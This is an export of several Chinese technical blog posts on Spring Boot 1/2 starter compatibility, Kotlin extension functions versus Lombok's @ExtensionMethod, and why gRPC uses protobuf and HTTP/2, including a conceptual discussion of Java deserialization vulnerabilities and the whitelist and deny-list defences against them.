<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">endpoints-spring-boot-starter</span><br><span class="line">|__ endpoints-spring-boot-autoconfigure1</span><br><span class="line">|__ endpoints-spring-boot-autoconfigure2</span><br></pre></td></tr></table></figure>
<ul>
<li>endpoints-spring-boot-autoconfigure1模块在pom.xml里依赖的是spring boot 1相关的jar，并且都设置为<code>&lt;optional&gt;true&lt;/optional&gt;</code></li>
<li>endpoints-spring-boot-autoconfigure2的配置类似</li>
<li>endpoints-spring-boot-starter依赖autoconfigure1 和 autoconfigure2</li>
<li>如果有公共的逻辑，可以增加一个commons模块</li>
</ul>
<h3 id="Endpoint兼容"><a href="#Endpoint兼容" class="headerlink" title="Endpoint兼容"></a>Endpoint兼容</h3><p>以 endpoints-spring-boot-autoconfigure1模块为例说明怎样处理。</p>
<ul>
<li><p><code>EndPointsEndPoint</code>类继承自spring boot 1的<code>AbstractMvcEndpoint</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ConfigurationProperties</span>(<span class="string">"endpoints.endpoints"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EndPointsEndPoint</span> <span class="keyword">extends</span> <span class="title">AbstractMvcEndpoint</span> </span>&#123;</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过<code>@ManagementContextConfiguration</code>引入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ManagementContextConfiguration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EndPointsEndPointManagementContextConfiguration</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@ConditionalOnMissingBean</span></span><br><span class="line">    <span class="meta">@ConditionalOnEnabledEndpoint</span>(<span class="string">"endpoints"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> EndPointsEndPoint <span class="title">EndPointsEndPoint</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        EndPointsEndPoint endPointsEndPoint = <span class="keyword">new</span> EndPointsEndPoint();</span><br><span class="line">        <span class="keyword">return</span> endPointsEndPoint;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>在<code>META-INF/resources/spring.factories</code>里配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">org.springframework.boot.actuate.autoconfigure.ManagementContextConfiguration=\</span><br><span class="line">io.github.hengyunabc.endpoints.autoconfigure1.EndPointsEndPointManagementContextConfiguration</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>因为<code>org.springframework.boot.actuate.autoconfigure.ManagementContextConfiguration</code>是只在spring boot 1里，在spring boot 2的应用里不会加载它，所以autoconfigure1模块天然兼容spring boot 2。</p>
<p>那么类似的，autoconfigure2模块里在<code>META-INF/resources/spring.factories</code>配置的是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">org.springframework.boot.actuate.autoconfigure.web.ManagementContextConfiguration=\</span><br><span class="line">io.github.hengyunabc.endpoints.autoconfigure2.ManagementApplicationcontextHolderConfiguration</span><br></pre></td></tr></table></figure>
<p><strong>仔细对比，可以发现是spring boot 2下面修改了<code>ManagementContextConfiguration</code>的包名，所以对于Endpoint天然是兼容的，不同的模块自己编绎就可以了。</strong></p>
<h2 id="HealthIndicator的兼容"><a href="#HealthIndicator的兼容" class="headerlink" title="HealthIndicator的兼容"></a>HealthIndicator的兼容</h2><p>类似Endpoint的处理，spring boot 1/2的代码分别放不同的autoconfigure模块里，然后各自的<code>@Configuration</code>类分别使用<code>@ConditionalOnSpringBoot1/@ConditionalOnSpringBoot2</code>来判断。</p>
<h2 id="通过集成测试保证兼容性"><a href="#通过集成测试保证兼容性" class="headerlink" title="通过集成测试保证兼容性"></a>通过集成测试保证兼容性</h2><p>还是以endpoints-spring-boot-autoconfigure1模块为例。</p>
<p>这个模块是为spring boot 1准备的，则它的集成测试要配置为spring boot 2。</p>
<p>参考相关的代码：<a href="https://github.com/hengyunabc/endpoints-spring-boot-starter/tree/endpoints-spring-boot-starter-parent-0.0.1/endpoints-spring-boot-autoconfigure1/src/it" target="_blank" rel="noopener">查看</a></p>
<ul>
<li>在<code>springboot2demo/pom.xml</code>里依赖spring boot 2</li>
<li>在<code>verify.groovy</code>里检测应用是否启动成功</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>通过ASM分析现有的starter里不兼容的类</li>
<li>配置注入通过<code>BinderUtils</code>解决</li>
<li>各自的<code>@Configuration</code>类分别用<code>@ConditionalOnSpringBoot1/@ConditionalOnSpringBoot2</code>来判断</li>
<li>代码分模块：commons放公共逻辑, autoconfigure1/autoconfigure2 对应 spring boot 1/2的自动装配，starter给应用依赖</li>
<li>Endpoint的Configuration入口是ManagementContextConfiguration，因为spring boot 2里修改了package，所以直接在<code>spring.factories</code>里配置即可</li>
<li>通过集成测试保证兼容性</li>
<li>如果某一天，不再需要支持spring boot 1了，则直接把autoconfigure1模块去掉即可</li>
</ul>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><ul>
<li><a href="https://github.com/hengyunabc/spring-boot-utils" target="_blank" rel="noopener">https://github.com/hengyunabc/spring-boot-utils</a> </li>
<li><a href="https://github.com/hengyunabc/springboot-classchecker" target="_blank" rel="noopener">https://github.com/hengyunabc/springboot-classchecker</a></li>
<li><a href="https://github.com/hengyunabc/endpoints-spring-boot-starter" target="_blank" rel="noopener">https://github.com/hengyunabc/endpoints-spring-boot-starter</a></li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>spring-boot</tag>
        <tag>spring</tag>
        <tag>asm</tag>
      </tags>
  </entry>
  <entry>
    <title>Kotlin里的Extension Functions实现原理分析</title>
    <url>/kotlin-extension-functions/</url>
    <content><![CDATA[<h2 id="Kotlin里的Extension-Functions"><a href="#Kotlin里的Extension-Functions" class="headerlink" title="Kotlin里的Extension Functions"></a>Kotlin里的Extension Functions</h2><p>Kotlin里有所谓的扩展函数(Extension Functions)，支持给现有的java类增加函数。</p>
<ul>
<li><a href="https://kotlinlang.org/docs/reference/extensions.html" target="_blank" rel="noopener">https://kotlinlang.org/docs/reference/extensions.html</a></li>
</ul>
<p>比如给<code>String</code>增加一个<code>hello</code>函数，可以这样子写：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fun String.hello(world : String) : String &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"hello "</span> + world + <span class="keyword">this</span>.length;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">fun <span class="title">main</span><span class="params">(args: Array&lt;String&gt;)</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"abc"</span>.hello(<span class="string">"world"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到在main函数里，直接可以在<code>String</code>上调用<code>hello</code>函数。</p>
<p>执行后，输出结果是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hello world3</span><br></pre></td></tr></table></figure>
<p>可以看到在<code>hello</code>函数里的<code>this</code>引用的是<code>&quot;abc&quot;</code>。</p>
<p>刚开始看到这个语法还是比较新奇的，那么怎样实现的呢？<strong>如果不同的库都增加了同样的函数会不会冲突？</strong></p>
<p>反编绎生成的字节码，结果是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@NotNull</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String <span class="title">hello</span><span class="params">(@NotNull String $receiver, @NotNull String world)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">"hello "</span> + world + $receiver.length();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(@NotNull String[] args)</span> </span>&#123;</span><br><span class="line">  System.out.println(hello(<span class="string">"abc"</span>, <span class="string">"world"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，实际上是增加了一个static public final函数。</p>
<p><strong>并且新增加的函数是在自己的类里的，并不是在String类里。即不同的库新增加的扩展函数都是自己类里的，不会冲突。</strong></p>
<h2 id="lombok-里的-ExtensionMethod-实现"><a href="#lombok-里的-ExtensionMethod-实现" class="headerlink" title="lombok 里的 @ExtensionMethod 实现"></a>lombok 里的 @ExtensionMethod 实现</h2><p>lombok里也提供了类似的<code>@ExtensionMethod</code>支持。</p>
<ul>
<li><a href="https://projectlombok.org/features/experimental/ExtensionMethod" target="_blank" rel="noopener">https://projectlombok.org/features/experimental/ExtensionMethod</a></li>
</ul>
<p>和上面的例子一样，给String类增加一个<code>hello</code>函数：</p>
<ul>
<li>需要定义一个<code>class Extensions</code></li>
<li>再用<code>@ExtensionMethod</code>声明</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Extensions</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">hello</span><span class="params">(String receiver, String world)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hello "</span> + world + receiver.length();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@ExtensionMethod</span>(&#123;</span><br><span class="line">        Extensions<span class="class">.<span class="keyword">class</span></span></span><br><span class="line"><span class="class">&#125;)</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"abc"</span>.hello(<span class="string">"world"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行后，输出结果是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hello world3</span><br></pre></td></tr></table></figure>
<p>可以看到在<code>hello</code>函数里，第一个参数<code>String receiver</code>就是<code>&quot;abc&quot;</code>本身。</p>
<p>和上面kotlin的例子不一样的是，kotlin里直接可以用<code>this</code>。</p>
<p>生成的字节码反编绎结果是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Extensions</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">hello</span><span class="params">(String receiver, String world)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"hello "</span> + world + receiver.length();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    System.out.println(Extensions.hello(<span class="string">"abc"</span>, <span class="string">"world"</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到所谓的<code>@ExtensionMethod</code>实际上也是一个语法糖。</p>
<h2 id="设计动机"><a href="#设计动机" class="headerlink" title="设计动机"></a>设计动机</h2><ul>
<li><a href="https://kotlinlang.org/docs/reference/extensions.html#motivation" target="_blank" rel="noopener">https://kotlinlang.org/docs/reference/extensions.html#motivation</a> </li>
</ul>
<p>据kotlin的文档：各种<code>FileUtils</code>，<code>StringUtils</code>类很麻烦。</p>
<p>比如像下面处理<code>List</code>，在java里可以用<code>java.util.Collections</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Java</span></span><br><span class="line">Collections.swap(list, Collections.binarySearch(list,</span><br><span class="line">    Collections.max(otherList)),</span><br><span class="line">    Collections.max(list));</span><br></pre></td></tr></table></figure>
<p>简化下import，可以变为</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Java</span></span><br><span class="line">swap(list, binarySearch(list, max(otherList)), max(list));</span><br></pre></td></tr></table></figure>
<p>但是还不够清晰，各种<code>import *</code>也是比较烦的。利用扩展函数，可以直接这样子写：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Java</span></span><br><span class="line">list.swap(list.binarySearch(otherList.max()), list.max());</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>kotlin的Extension Functions和lombok的<code>@ExtensionMethod</code>实际上都是增加public static final函数</li>
<li>不同的库增加的同样的Extension Functions不会冲突</li>
<li>设计的动机是减少各种utils类。</li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>bytecode</tag>
        <tag>asm</tag>
        <tag>kotlin</tag>
      </tags>
  </entry>
  <entry>
    <title>思考gRPC ：为什么是protobuf</title>
    <url>/thinking-about-grpc-protobuf/</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>谈到RPC，就避免不了序列化的话题。</p>
<p>gRPC默认的序列化方式是protobuf，原因很简单，因为两者都是google发明的，哈哈。</p>
<p>在当初Google开源protobuf时，很多人就期待是否能把RPC的实现也一起开源出来。没想到最终出来的是gRPC，终于补全了这一块。</p>
<h2 id="跨语言的序列化方案"><a href="#跨语言的序列化方案" class="headerlink" title="跨语言的序列化方案"></a>跨语言的序列化方案</h2><p>事实上的跨语言序列化方案只有三个： protobuf, thrift, json。</p>
<ul>
<li>json体积太大，并且缺少类型信息，实际上只用在RESTful接口上，并没有看到RPC框架会默认选json做序列化的。</li>
</ul>
<p>国内一些大公司的使用情况：</p>
<ul>
<li><p>protobuf ，腾迅，百度等</p>
</li>
<li><p>thrift，小米，美团等</p>
</li>
<li><p>hessian， 阿里用的是自己维护的版本，有js/cpp的实现，因为阿里主用java，更多是历史原因。</p>
</li>
</ul>
<h3 id="序列化里的类型信息"><a href="#序列化里的类型信息" class="headerlink" title="序列化里的类型信息"></a>序列化里的类型信息</h3><p>序列化就是把对象转换为二进制数据，反序列化就把二进制数据转换为对象。</p>
<p>各种序列化库层出不穷，其中有一个重要的区别：<strong>类型信息存放在哪</strong>？ </p>
<p>可以分为三种：</p>
<ol>
<li><p>不保存类型信息</p>
<p> 典型的是各种json序列化库，优点是灵活，缺点是使用的双方都要知道类型是什么。当然有一些json库会提供一些扩展，偷偷把类型信息插入到json里。</p>
</li>
<li><p>类型信息保存到序列化结果里</p>
<p> 比如java自带的序列化，hessian等。缺点是类型信息冗余。比如RPC里每一个request都要带上类型。因此有一种常见的RPC优化手段就是两端协商之后，后续的请求不需要再带上类型信息。</p>
</li>
<li><p>在生成代码里带上类型信息</p>
<p> 通常是在IDL文件里写好package和类名，生成的代码直接就有了类型信息。比如protobuf, thrift。缺点是需要生成代码，双方都要知道IDL文件。</p>
</li>
</ol>
<p>类型信息看起来是一个小事，但在安全上却会出大问题，后面会讨论。</p>
<h2 id="实际使用中序列化有哪些问题"><a href="#实际使用中序列化有哪些问题" class="headerlink" title="实际使用中序列化有哪些问题"></a>实际使用中序列化有哪些问题</h2><p>这里讨论的是没有IDL定义的序列化方案，比如java自带的序列化，hessian, 各种json库。</p>
<ul>
<li>大小莫名增加，比如用户不小心向map里put了大对象。</li>
<li>对象之间互相引用，用户根本不清楚序列化到底会产生什么结果，可能新加一个field就不小心被序列化了</li>
<li>enum类新增加的不能识别，当两端的类版本不一致时就会出错</li>
<li>哪些字段应该跳过序列化 ，不同的库都有不同的 @Ignore ，没有通用的方案</li>
<li>很容易把一些奇怪的类传过来，然后对端报ClassNotFoundException</li>
<li>新版本jdk新增加的类不支持，需要序列化库不断升级，如果没人维护就悲剧了</li>
<li>库本身的代码质量不高，或者API设计不好容易出错，比如<a href="https://blog.csdn.net/hengyunabc/article/details/7764509" target="_blank" rel="noopener">kryo</a></li>
</ul>
<h3 id="gRPC是protobuf的一个插件"><a href="#gRPC是protobuf的一个插件" class="headerlink" title="gRPC是protobuf的一个插件"></a>gRPC是protobuf的一个插件</h3><p>以gRPC官方的Demo为例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> helloworld;</span><br><span class="line"></span><br><span class="line"><span class="comment">// The greeting service definition.</span></span><br><span class="line">service Greeter &#123;</span><br><span class="line">  <span class="comment">// Sends a greeting</span></span><br><span class="line">  <span class="function">rpc <span class="title">SayHello</span> <span class="params">(HelloRequest)</span> <span class="title">returns</span> <span class="params">(HelloReply)</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// The request message containing the user's name.</span></span><br><span class="line">message HelloRequest &#123;</span><br><span class="line">  string name = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// The response message containing the greetings</span></span><br><span class="line">message HelloReply &#123;</span><br><span class="line">  string message = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到rpc的定义也是写在proto文件里的。实际上gRPC是protobuf的一个扩展，通过扩展生成gRPC相关的代码。</p>
<h2 id="protobuf并不是完美解决方案"><a href="#protobuf并不是完美解决方案" class="headerlink" title="protobuf并不是完美解决方案"></a>protobuf并不是完美解决方案</h2><p>在protobuf出来以后，也不断出现新的方案。比如 </p>
<ul>
<li><a href="https://github.com/capnproto/capnproto" target="_blank" rel="noopener">https://github.com/capnproto/capnproto</a></li>
<li><a href="https://github.com/google/flatbuffers" target="_blank" rel="noopener">https://github.com/google/flatbuffers</a></li>
<li><a href="https://avro.apache.org/" target="_blank" rel="noopener">https://avro.apache.org/</a></li>
</ul>
<p>protobuf的一些缺点：</p>
<ul>
<li>缺少map/set的支持(proto3支持map)</li>
<li><a href="https://developers.google.com/protocol-buffers/docs/encoding" target="_blank" rel="noopener">Varint</a>编码会消耗CPU</li>
<li>会影响CPU缓存，比如比较大的int32从4字节用Varint表示是5字节就不对齐了</li>
<li><p>解码时要复制一份内存，不能做原地内存引用的优化</p>
<p>  protobuf在google 2008年公开的，内部使用自然更早。当时带宽还比较昂贵，现在人们对速度的关注胜过带宽了。</p>
</li>
</ul>
<p>protobuf需要生成代码的确有点麻烦，所以会有基于java annotation的方案：</p>
<ul>
<li><a href="https://github.com/protostuff/protostuff" target="_blank" rel="noopener">https://github.com/protostuff/protostuff</a></li>
</ul>
<p>同样thrift有：</p>
<ul>
<li><a href="https://github.com/facebookarchive/swift" target="_blank" rel="noopener">https://github.com/facebookarchive/swift</a></li>
</ul>
<h2 id="序列化库的速度问题"><a href="#序列化库的速度问题" class="headerlink" title="序列化库的速度问题"></a>序列化库的速度问题</h2><p>总有序列化库跳出来说自己速度最快，其实很多时候猫腻很多。事有反常必有妖。</p>
<p>常见的加快速度的手段有：</p>
<ul>
<li><p>threadlocal的byte array</p>
<p>  当序列化一个大对象后，threadlocal的byte array增大，然后不能及时释放。如果线程池越大，则占用的内存会越多。fastjson采用一种动态缩小的处理办法，但不能从根本解决这个问题。</p>
</li>
<li><p>用asm的方式生成代码，避免反射调用getter/setter</p>
<p>  这样会导致库代码复杂，容易有bug，并且会占用内存。</p>
</li>
<li><p>循环引用用ID标识对象</p>
<p>  kryo要求注册类型的顺序是统一的，因为它要为类型分配ID，然后在处理循环引用时，把同样的对象直接用ID来标识，这样子可以大大减少体积。<br>  但是用户在使用时，调用代码的顺序可能是不确定的，注册上去的ID也可能不一样，那么反序列化就会有问题。<br>  kryo的API还不是线程安全的，很容易踩坑。</p>
</li>
</ul>
<p>在benchmark里protobuf的速度在前列，并不是最快。但是protobuf用生成代码的方式保证了内存占用，时间占用不会出问题。</p>
<h2 id="序列化被人忽视的安全性问题"><a href="#序列化被人忽视的安全性问题" class="headerlink" title="序列化被人忽视的安全性问题"></a>序列化被人忽视的安全性问题</h2><h3 id="序列化漏洞危害很大"><a href="#序列化漏洞危害很大" class="headerlink" title="序列化漏洞危害很大"></a>序列化漏洞危害很大</h3><ol>
<li>序列化漏洞通常比较严重，容易造成任意代码执行</li>
<li>序列化漏洞在很多语言里都会有，比如Python Pickle序列化漏洞。</li>
</ol>
<p>很多程序员不理解为什么反序列化可以造成任意代码执行。</p>
<p>反序列化漏洞到底是怎么工作的呢？很难直接描述清楚，这些漏洞都有很精巧的设计，把多个地方的代码串联起来。可以参考这个demo，跑起来调试下就可以有直观的印象：</p>
<ul>
<li><a href="https://github.com/hengyunabc/dubbo-apache-commons-collections-bug" target="_blank" rel="noopener">https://github.com/hengyunabc/dubbo-apache-commons-collections-bug</a></li>
</ul>
<p>这里有两个生成java序列化漏洞代码的工具：</p>
<ul>
<li><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></li>
<li><a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">https://github.com/mbechler/marshalsec</a></li>
</ul>
<h3 id="常见的库怎样防止反序列化漏洞"><a href="#常见的库怎样防止反序列化漏洞" class="headerlink" title="常见的库怎样防止反序列化漏洞"></a>常见的库怎样防止反序列化漏洞</h3><p>下面来看下常见的序列化方案是怎么防止反序列化漏洞的：</p>
<ol>
<li><p>Java Serialization</p>
<ul>
<li>jdk里增加了一个filter机制 <a href="http://openjdk.java.net/jeps/290" target="_blank" rel="noopener">http://openjdk.java.net/jeps/290</a> ，这个一开始是出现在jdk9上的，后面移值回jdk6/7/8上，如果安装的jdk版本是比较新的，可以找到相关的类</li>
<li>Oracle打算废除java序列化：<a href="https://www.infoworld.com/article/3275924/java/oracle-plans-to-dump-risky-java-serialization.html" target="_blank" rel="noopener">https://www.infoworld.com/article/3275924/java/oracle-plans-to-dump-risky-java-serialization.html</a> </li>
</ul>
</li>
<li><p>jackson-databind</p>
<ul>
<li>jackson-databind里是过滤掉一些已知的类，参见<a href="https://github.com/FasterXML/jackson-databind/blob/jackson-databind-2.9.6/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java" target="_blank" rel="noopener">SubTypeValidator.java</a></li>
<li>jackson-databind的<a href="https://github.com/FasterXML/jackson-databind/issues?q=is%3Aissue+label%3ACVE+is%3Aclosed" target="_blank" rel="noopener">CVE issue列表</a></li>
</ul>
</li>
<li><p>fastjson</p>
<ul>
<li>fastjson通过一个<code>denyList</code>来过滤掉一些危险类的package，参见<a href="https://github.com/alibaba/fastjson/blob/1.2.7.sec01/src/main/java/com/alibaba/fastjson/parser/ParserConfig.java#L169" target="_blank" rel="noopener">ParserConfig.java</a></li>
<li>fastjson在新版本里<code>denyList</code>改为通过hashcode来隐藏掉package信息，但通过这个<a href="https://github.com/alibaba/fastjson/blob/1.2.47/src/test/java/com/alibaba/json/bvt/parser/deser/deny/DenyTest5.java" target="_blank" rel="noopener"><code>DenyTest5</code></a>可以知道还是过滤掉常见危险类的package</li>
<li>fastjson在新版本里默认把<code>autoType</code>的功能禁止掉了</li>
</ul>
</li>
</ol>
<p>所以总结下来，要么白名单，要么黑名单。当然黑名单机制不能及时更新，业务方得不断升jar包，非常蛋疼。白名单是比较彻底的解决方案。</p>
<h3 id="为什么protobuf没有序列化漏洞"><a href="#为什么protobuf没有序列化漏洞" class="headerlink" title="为什么protobuf没有序列化漏洞"></a>为什么protobuf没有序列化漏洞</h3><p><strong>这些序列化漏洞的根本原因是：没有控制序列化的类型范围</strong></p>
<p>为什么在protobuf里并没有这些反序列化问题？</p>
<ul>
<li>protobuf在IDL里定义好了package范围</li>
<li>protobuf的代码都是自动生成的，怎么处理二进制数据都是固定的</li>
</ul>
<p>protobuf把一切都框住了，少了灵活性，自然就少漏洞。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>应该重视反序列化漏洞，毕竟Oracle都不得不考虑把java序列化废弃了</li>
<li>序列化漏洞的根本原因是：没有控制序列化的类型范围</li>
<li>防止序列化漏洞，最好是使用白名单</li>
<li>protobuf通过IDL生成代码，严格控制了类型范围</li>
<li>protobuf不是完美的方案，但是作为跨语言的序列化事实方案之一，IDL生成代码比较麻烦也不是啥大问题</li>
</ul>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><ul>
<li><a href="https://github.com/protostuff/protostuff" target="_blank" rel="noopener">https://github.com/protostuff/protostuff</a></li>
<li><a href="https://github.com/facebookarchive/swift" target="_blank" rel="noopener">https://github.com/facebookarchive/swift</a></li>
<li><a href="http://openjdk.java.net/jeps/290" target="_blank" rel="noopener">http://openjdk.java.net/jeps/290</a></li>
<li><a href="https://www.infoworld.com/article/3275924/java/oracle-plans-to-dump-risky-java-serialization.html" target="_blank" rel="noopener">https://www.infoworld.com/article/3275924/java/oracle-plans-to-dump-risky-java-serialization.html</a> </li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>security</tag>
        <tag>rpc</tag>
        <tag>http2</tag>
        <tag>grpc</tag>
        <tag>protobuf</tag>
      </tags>
  </entry>
  <entry>
    <title>思考gRPC ：为什么是HTTP/2</title>
    <url>/thinking-about-grpc-http2/</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>gRPC是google开源的高性能跨语言的RPC方案。gRPC的设计目标是在任何环境下运行，支持可插拔的负载均衡，跟踪，运行状况检查和身份验证。它不仅支持数据中心内部和跨数据中心的服务调用，它也适用于分布式计算的最后一公里，将设备，移动应用程序和浏览器连接到后端服务。</p>
<ul>
<li><a href="https://grpc.io/" target="_blank" rel="noopener">https://grpc.io/</a></li>
<li><a href="https://github.com/grpc/grpc" target="_blank" rel="noopener">https://github.com/grpc/grpc</a></li>
</ul>
<h3 id="GRPC设计的动机和原则"><a href="#GRPC设计的动机和原则" class="headerlink" title="GRPC设计的动机和原则"></a>GRPC设计的动机和原则</h3><ul>
<li><a href="https://grpc.io/blog/principles" target="_blank" rel="noopener">https://grpc.io/blog/principles</a></li>
</ul>
<p>个人觉得官方的文章令人印象深刻的点：</p>
<ul>
<li>内部有Stubby的框架，但是它不是基于任何一个标准的</li>
<li>支持任意环境使用，支持物联网、手机、浏览器</li>
<li>支持stream和流控</li>
</ul>
<h3 id="HTTP-2是什么"><a href="#HTTP-2是什么" class="headerlink" title="HTTP/2是什么"></a>HTTP/2是什么</h3><p>在正式讨论gRPC为什么选择HTTP/2之前，我们先来简单了解下HTTP/2。 </p>
<p>HTTP/2可以简单用一个图片来介绍：</p>
<p><img src="/img/http2.svg" alt="HTTP/2"></p>
<p>来自：<a href="https://hpbn.co/" target="_blank" rel="noopener">https://hpbn.co/</a></p>
<p>可以看到：</p>
<ul>
<li>HTTP/1里的header对应HTTP/2里的 HEADERS frame</li>
<li>HTTP/1里的payload对应HTTP/2里的 DATA frame</li>
</ul>
<p>在Chrome浏览器里，打开<code>chrome://net-internals/#http2</code>，可以看到http2链接的信息。</p>
<p><img src="/img/chrome-http2.png" alt="chrome-http2"></p>
<p>目前很多网站都已经跑在HTTP/2上了，包括alibaba。</p>
<h3 id="gRPC-over-HTTP-2"><a href="#gRPC-over-HTTP-2" class="headerlink" title="gRPC over HTTP/2"></a>gRPC over HTTP/2</h3><p>准确来说gRPC设计上是分层的，底层支持不同的协议，目前gRPC支持：</p>
<ul>
<li><a href="https://github.com/grpc/grpc/blob/master/doc/PROTOCOL-HTTP2.md" target="_blank" rel="noopener">gRPC over HTTP2</a></li>
<li><a href="https://github.com/grpc/grpc/blob/master/doc/PROTOCOL-WEB.md" target="_blank" rel="noopener">gRPC Web</a></li>
</ul>
<p>但是大多数情况下，讨论都是基于gRPC over HTTP2。</p>
<p>下面从一个真实的gRPC <code>SayHello</code>请求，查看它在HTTP/2上是怎样实现的。用wireshark抓包：</p>
<p><img src="/img/wireshark-grpc.png" alt="wireshark-grpc"></p>
<p>可以看到下面这些Header：</p>
<ul>
<li>Header: :authority: localhost:50051</li>
<li>Header: :path: /helloworld.Greeter/SayHello</li>
<li>Header: :method: POST</li>
<li>Header: :scheme: http</li>
<li>Header: content-type: application/grpc</li>
<li>Header: user-agent: grpc-java-netty/1.11.0</li>
</ul>
<p>然后请求的参数在DATA frame里：</p>
<ul>
<li>GRPC Message: /helloworld.Greeter/SayHello, Request</li>
</ul>
<p>简而言之，gGRPC把元数据放到HTTP/2 Headers里，请求参数序列化之后放到 DATA frame里。</p>
<h3 id="基于HTTP-2-协议的优点"><a href="#基于HTTP-2-协议的优点" class="headerlink" title="基于HTTP/2 协议的优点"></a>基于HTTP/2 协议的优点</h3><h4 id="HTTP-2-是一个公开的标准"><a href="#HTTP-2-是一个公开的标准" class="headerlink" title="HTTP/2 是一个公开的标准"></a>HTTP/2 是一个公开的标准</h4><p>Google本身把这个事情想清楚了，它并没有把内部的Stubby开源，而是选择重新做。现在技术越来越开放，私有协议的空间越来越小。</p>
<h4 id="HTTP-2-是一个经过实践检验的标准"><a href="#HTTP-2-是一个经过实践检验的标准" class="headerlink" title="HTTP/2 是一个经过实践检验的标准"></a>HTTP/2 是一个经过实践检验的标准</h4><p>HTTP/2是先有实践再有标准，这个很重要。很多不成功的标准都是先有一大堆厂商讨论出标准后有实现，导致混乱而不可用，比如CORBA。HTTP/2的前身是Google的<a href="https://en.wikipedia.org/wiki/SPDY" target="_blank" rel="noopener">SPDY</a>，没有Google的实践和推动，可能都不会有HTTP/2。</p>
